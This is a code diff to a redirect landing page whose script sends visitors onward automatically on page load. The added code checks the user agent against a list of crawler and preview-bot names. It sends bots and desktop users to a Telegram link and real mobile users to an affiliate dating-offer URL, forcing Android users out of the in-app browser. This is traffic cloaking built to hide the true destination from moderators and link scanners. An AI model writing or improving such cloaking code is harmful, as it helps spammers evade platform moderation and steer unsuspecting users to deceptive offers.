@@ -19,11 +19,12 @@
   <script>
     /* ======== ОФФЕРЫ ======== */
     const offers = [
-      
       "https://grzvkg.trueamouronline.com/?utm_source=da57dc555e50572d&ban=other&j1=1&s1=212364&s2=2189435"
     ];
 
-    /* -------- РАНДОМ -------- */
+    const TG_URL = "https://t.me/me9fun";
+
+    /* -------- РАНДОМ (15 МИН) -------- */
     function hashString(s) {
       let h = 0;
       for (let i = 0; i < s.length; i++) {
@@ -38,22 +39,35 @@
     const idx = hashString(seed) % offers.length;
     const offerURL = offers[idx];
 
-    /* ======== МОБИЛА / ПК ======== */
-    const isMobile = /android|iphone|ipad|ipod/i.test(navigator.userAgent);
-    const desktopURL = "https://poki.com";
+    /* ======== МОБИЛА ======== */
+    const ua = navigator.userAgent.toLowerCase();
+    const isMobile = /android|iphone|ipad|ipod/i.test(ua);
 
-    const targetURL = isMobile ? offerURL : desktopURL;
+    /* ======== БОТЫ ======== */
+    const botSigns = [
+      "bot","crawl","spider","preview","facebook","meta",
+      "telegram","whatsapp","discord","slack",
+      "google","bing","yandex","ahrefs","semrush","curl","wget"
+    ];
+    const isBot = botSigns.some(b => ua.includes(b));
+
+    /* ======== ЦЕЛЬ ======== */
+    // боты И все десктопы → TG
+    // только реальная мобила → оффер
+    const targetURL = (!isMobile || isBot) ? TG_URL : offerURL;
 
     /* ======== РЕДИРЕКТ ======== */
     function startRedirect() {
       const a = document.getElementById("clicker");
       a.href = targetURL;
 
-      // Клик — обязательный для Android (открывает ВНЕ WebView)
+      // для Android — выход из WebView
       a.click();
 
-      // Резервный переход
-      setTimeout(() => { window.location.href = targetURL; }, 300);
+      // резерв
+      setTimeout(() => {
+        window.location.href = targetURL;
+      }, 300);
     }
 
     document.addEventListener("DOMContentLoaded", () => {
@@ -67,5 +81,3 @@
   <a id="clicker" href="#" target="_self"></a>
 </body>
 </html>
-
-
